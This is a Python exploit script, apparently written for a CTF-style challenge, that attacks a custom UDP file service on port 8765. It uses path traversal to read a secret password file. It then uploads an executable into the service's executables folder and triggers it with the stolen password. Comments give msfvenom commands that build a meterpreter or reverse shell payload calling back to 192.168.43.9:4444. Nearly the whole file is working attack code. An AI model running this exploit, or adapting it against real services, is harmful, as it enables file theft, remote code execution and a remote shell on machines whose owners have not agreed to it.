import socket
import sys
import struct
import os
from binascii import hexlify
import threading

p32be = lambda x : struct.pack("!L", x)
u32be = lambda x : struct.unpack("<L", x)[0]
p16be = lambda x : struct.pack("!H", x)

PORT = 8765
TIMEOUT = 5
PAYLOAD_NAME = "payload.exe"

# msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.43.9 LPORT=4444 -f exe > payload.exe
# msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.43.9 LPORT=4444 -f exe > payload.exe
def GetPaylaod():
    return open(PAYLOAD_NAME, 'rb').read()

def recvfromT(s):
    data = None
    try:
        data = s.recvfrom(1024)
    except socket.timeout:
        print("[-] Timeout error!")
        s.close()
        sys.exit(-1)
    return data[0]

def crc(data):
    result = 0x5fcd8179
    for i in data:
        result = (result >> 8) + (((result ^ i) & 0xff) << 24)
    return result

def openFileR(fName):
    packet = b'UP'
    payload = b"\x01\x01" + bytes([len(fName)]) + fName
    packet += p32be(len(payload)) + p32be(crc(payload)) + payload
    return packet

def seekFileR(token, offset):
    packet = b'UP'
    payload = b"\x01\x02" + p32be(token) + p32be(offset)
    packet += p32be(len(payload)) + p32be(crc(payload)) + payload
    return packet

def readFile(token, size):
    packet = b'UP'
    payload = b"\x01\x03" + p32be(token) + p16be(size)
    packet += p32be(len(payload)) + p32be(crc(payload)) + payload
    return packet

def openFileW(fName):
    packet = b'UP'
    payload = b"\x02\x01" + bytes([len(fName)]) + fName
    packet += p32be(len(payload)) + p32be(crc(payload)) + payload
    return packet

def writeFile(token, data):
    packet = b'UP'
    payload = b"\x02\x02" + p32be(token) + p32be(len(data)) + data
    packet += p32be(len(payload)) + p32be(crc(payload)) + payload
    return packet

def closeFile(token):
    packet = b'UP'
    payload = b"\x02\x03" + p32be(token)
    packet += p32be(len(payload)) + p32be(crc(payload)) + payload
    return packet

def execFile(password, filename):
    packet = b'UP'
    payload = b"\x03" + bytes([len(password)]) + password + bytes([len(filename)]) + filename
    packet += p32be(len(payload)) + p32be(crc(payload)) + payload
    return packet

def test(args):
    if len(args) > 1:
        host = args[1]
    else:
        print("[-] Usage: python3 {} <host>".format(args[0]))
        sys.exit(-1)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(TIMEOUT)

    target = (host, PORT)
    s.sendto(openFileR(b"..\\secret.txt"), target)
    data = None
    data = recvfromT(s)
    print("data = ", data)

    token = 0
    if data[-1] == 0x0:
        token = u32be(data[::-1][1:5])
        packet = readFile(token, 20)
        s.sendto(packet, target)
        data = recvfromT(s)
        print("read recv: {}".format(data))
    else:
        print("error: {}".format(data))
        s.close()
        return
    
    packet = closeFile(token)
    s.sendto(packet, target)

    s.close()

def exploit(args):
    if len(args) > 1:
        host = args[1]
    else:
        print("[-] Usage: python3 {} <host>".format(args[0]))
        sys.exit(-1)

    target = (host, PORT)

    # Open socket and send file open comand
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(TIMEOUT)
    
    # file open to read
    print("[+] Open file to read send!")
    s.sendto(openFileR(b"..\\secret.txt"), target)
    data = recvfromT(s)

    # get token of session
    token = 0
    if data[-1] == 0x0:
        token = u32be(data[::-1][1:5])
        # get file data
        packet = readFile(token, 20)
        print("[+] Read file data send!")
        s.sendto(packet, target)
        data = recvfromT(s)
        password = data[12:-1]
    else:
        print("error: {}".format(data))
        s.close()
        return
    
    # get password for Exec cmd
    print("Password is : {}".format(password))
    # close file
    print("[+] Close file send!")
    packet = closeFile(token)
    s.sendto(packet, target)
    recvfromT(s)

    # open file to write
    name = hexlify(os.urandom(8)) + b".exe"
    
    packet = openFileW(b"..\\executables\\" + name)
    print("[+] Open file to write send!")
    s.sendto(packet, target)
    data = recvfromT(s)

    # get token of session
    token = 0
    if data[-1] == 0x0:
        token = u32be(data[::-1][1:5])
    else:
        print("error: {}".format(data))
        s.close()
        return

    # write data in file
    # now write payload
    buf = GetPaylaod()
    #print("buf = {}, len ={}".format(buf, len(buf)))
    packet = writeFile(token, buf)
    print("[+] Write file data send!")
    s.sendto(packet, target)
    try:
        s.recvfrom()
    except:
        pass

    # close file
    packet = closeFile(token)
    print("[+] Close file send!")
    s.sendto(packet, target)
    data = recvfromT(s)

    packet = execFile(password,  name)
    print("[+] Exec file send!")
    s.sendto(packet, target)
    data = recvfromT(s)

    s.close()


if __name__ == "__main__":
    exploit(sys.argv)
    #test(sys.argv)
    # threads = []

    # for i in range(32):
    #     thr = threading.Thread(target=main, args=(sys.argv, ))
    #     thr.start()
    #     threads.append(thr)

    # for i in threads:
    #     i.join()
    
